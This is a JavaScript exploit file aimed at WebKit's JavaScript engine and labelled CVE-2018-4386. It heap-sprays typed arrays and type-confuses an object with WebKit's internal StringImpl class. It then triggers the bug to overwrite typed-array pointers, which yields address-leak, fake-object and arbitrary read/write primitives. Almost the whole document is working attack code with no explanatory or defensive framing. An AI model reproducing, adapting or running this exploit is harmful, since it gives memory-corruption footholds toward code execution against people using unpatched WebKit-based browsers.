// Arrays used for Addrof and Fakeobj primitives
let leaker_obj = { a: 0 };
let leaker_arr = new Uint32Array(6);

// Arrays used for Arbitrary Read and Write primitives
let oob_master = new Uint32Array(7);
let oob_slave = new Uint8Array(1024);

// Begin spraying JSView
let sprayed_structs = [];
for (let i = 0; i < 0x10000; i++) {
  let _struct = new Uint32Array(1);
  _struct[i + "spray"] = 123;
  // Add it to the array to keep it alive and avoid garbage collection.
  sprayed_structs.push(_struct);
}

// Our target object with specific properties.
let target = {
  a: 2.1100820415101592e-303, // Type-confused double value
  b: false,
  c: true,
  d: 5678
};

// Used when creating the Structure ID's of the StringImpl type-confused object. 
// This variable is increased by 32, each time new confused object is made.
// Max Value of 32768.
let implconfuse_idx = 0; 

// Creates and returns an object which is type-confused with the StringImpl class
// defined inside the 'WTF' namespace in the WebKit source (StringImpl.h) file.
function create_impl() {
  // The property 'a' is type-confused with the (mutable unsigned) m_hashAndFlags
  // variable defined inside the class StringImplShape, which itself is defined
  // in the following WebKit source header file "Source\WTF\wtf\text\StringImpl.h".
  let implobj = { a: target };

  // Create 32 objects to increase the type confusion counter.
  for (let i = 0; i < 32; i++, implconfuse_idx++)
    implobj[implconfuse_idx + "x"] = {};

  return implobj;
}

// Bug Triggering Function using CVE-2018-4386 Implementation.
function trigger(x) {
  if (impl.a != target) return;

  // The property 'a' is type-confused with the (RefPtr<StringImpl>) m_impl
  // variable defined inside the class "String", which itself is defined in
  // the following WebKit source header file "Source\WTF\wtf\text\WTFString.h".
  var o = { a: 1 };
  for (var i in o) {
    {
      i = x;
      function i() { }
    }
    // The following line sets bit 4 (|= 16) in the (mutable unsigned) variable
    // called m_hashAndFlags defined inside The StringImplShape Class within
    // the StringImpl.h file of the WebKit source (of the Running Browser).
    o[i];
  }

  if (impl.a != target) {
    // Memory leakage and out-of-bounds access happens here.
    target.c = leaker_obj;
    leaker_obj.a = leaker_obj;
    var l1 = impl.a[4];
    var l2 = impl.a[5];
    leaker_obj.a = oob_slave;
    var s1 = impl.a[4];
    var s2 = impl.a[5];
    target.c = leaker_arr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = oob_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    throw "BUG TRIGGERED";
  }
}

try {
  for (var _ = 0; _ < 1024; _++) {
    // JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those.
    var impl = create_impl();
    trigger({ a: impl });
  }
} catch (e) { printf(e); }
